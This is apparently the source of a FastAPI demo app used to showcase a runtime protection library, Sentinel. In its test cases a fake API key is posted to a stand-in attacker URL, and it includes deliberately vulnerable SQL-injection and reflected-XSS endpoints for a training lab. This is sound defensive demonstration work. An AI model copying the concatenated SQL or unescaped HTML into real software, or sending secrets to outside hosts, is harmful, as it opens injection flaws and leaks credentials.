"""Small, intentionally vulnerable application protected by Sentinel."""
from pathlib import Path
import sys
import sqlite3
import requests
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "python"))
from sentinel import protect, secret

app = FastAPI(title="Sentinel RASP test-case demo", version="0.1.0")
sentinel_runtime = protect(
    app,
    policy=Path(__file__).with_name("security.yaml"),
    security_log=Path(__file__).with_name("security-events.json"),
)

UNTRUSTED_DEFAULT = "https://attacker.example/collect"
# The trusted receiver lives in this demo app, so the allow-path works without
# requiring a second server during a judge presentation.
TRUSTED_DEFAULT = "http://127.0.0.1:8000/receiver"
LAB_DATABASE = Path(__file__).with_name("vuln-lab.sqlite3")

def initialise_lab_database():
    """Create deliberately non-sensitive, local-only data for the SQLi exercise."""
    with sqlite3.connect(LAB_DATABASE) as db:
        db.execute("CREATE TABLE IF NOT EXISTS documents (id INTEGER PRIMARY KEY, title TEXT, body TEXT)")
        if not db.execute("SELECT 1 FROM documents LIMIT 1").fetchone():
            db.executemany("INSERT INTO documents(title, body) VALUES (?, ?)", [
                ("Public status", "All local demo systems nominal."),
                ("Engineering notes", "Sentinel proof-of-concept checklist."),
                ("Internal demo record", "Fake record for local SQL injection exercise."),
            ])

initialise_lab_database()

class Destination(BaseModel):
    destination: str = Field(..., description="Outbound HTTP destination")

def get_secret() -> str:
    return "demo-api-key-not-for-production"

def send(destination: str, payload):
    """Sentinel's hook runs before this request can perform network I/O."""
    try:
        return requests.post(destination, data=payload, timeout=2)
    except requests.RequestException as exc:
        raise HTTPException(
            status_code=502,
            detail={"error": "outbound_request_failed", "destination": destination, "message": str(exc)},
        ) from exc

@app.get("/cases")
def list_cases():
    return {"cases": [
        {"id": "secret-untrusted", "endpoint": "POST /cases/secret-untrusted", "expected": "403 BLOCKED; no outbound connection"},
        {"id": "public-untrusted", "endpoint": "POST /cases/public-untrusted", "expected": "outbound request allowed"},
        {"id": "secret-trusted", "endpoint": "POST /cases/secret-trusted", "expected": "outbound request allowed to localhost"},
    ]}

@app.get("/security-events")
def security_events():
    """Read recorded security decisions without exposing secret values."""
    return {"events": sentinel_runtime.security_log.read()}

@app.get("/lab/status")
def lab_status():
    return {"engine": "ACTIVE", "policy": sentinel_runtime.policy.name,
            "violations": len(sentinel_runtime.security_log.read()),
            "protected_operation": "requests.Session.request"}

@app.post("/lab/reset")
def reset_lab():
    sentinel_runtime.security_log.clear()
    return {"status": "reset", "message": "Demo security-event log cleared."}

@app.get("/lab/sql-search")
def vulnerable_sql_search(query: str = ""):
    """INTENTIONALLY VULNERABLE: local-only SQL concatenation for the training lab.

    sqlite's execute() rejects multiple statements, limiting this exercise to
    predicate manipulation such as retrieving all seeded demo rows.
    """
    sql = f"SELECT id, title, body FROM documents WHERE title LIKE '%{query}%'"
    try:
        with sqlite3.connect(LAB_DATABASE) as db:
            rows = db.execute(sql).fetchall()
        return {"lab_only": True, "vulnerable": True, "executed_sql": sql,
                "results": [{"id": r[0], "title": r[1], "body": r[2]} for r in rows]}
    except sqlite3.DatabaseError as exc:
        return {"lab_only": True, "vulnerable": True, "executed_sql": sql, "sql_error": str(exc)}

@app.get("/lab/xss-preview", response_class=HTMLResponse)
def vulnerable_xss_preview(comment: str = ""):
    """INTENTIONALLY VULNERABLE: raw reflection for a sandboxed local XSS exercise."""
    return f"""<!doctype html><html><body style='font-family:system-ui;padding:16px'>
    <h3>Community comment preview</h3><div id='comment'>{comment}</div></body></html>"""

@app.post("/receiver")
async def trusted_receiver(request: Request):
    """Local, trusted sink used only to demonstrate an allowed operation."""
    payload_size = len(await request.body())
    return {"receiver": "trusted-local-demo", "received_bytes": payload_size}

@app.post("/cases/secret-untrusted")
def secret_to_untrusted(body: Destination = Destination(destination=UNTRUSTED_DEFAULT)):
    send(body.destination, secret(get_secret(), resource="API_KEY"))
    return {"case": "secret-untrusted", "status": "sent"}

@app.post("/cases/public-untrusted")
def public_to_untrusted(body: Destination = Destination(destination=UNTRUSTED_DEFAULT)):
    response = send(body.destination, "public-demo-payload")
    return {"case": "public-untrusted", "status": "sent", "upstream_status": response.status_code}

@app.post("/cases/secret-trusted")
def secret_to_trusted(body: Destination = Destination(destination=TRUSTED_DEFAULT)):
    response = send(body.destination, secret(get_secret(), resource="API_KEY"))
    return {"case": "secret-trusted", "status": "sent", "upstream_status": response.status_code}

@app.post("/send-secret")
def send_secret(destination: str = UNTRUSTED_DEFAULT):
    return secret_to_untrusted(Destination(destination=destination))

@app.get("/", response_class=HTMLResponse)
def dashboard():
    return Path(__file__).with_name("dashboard.html").read_text(encoding="utf-8")
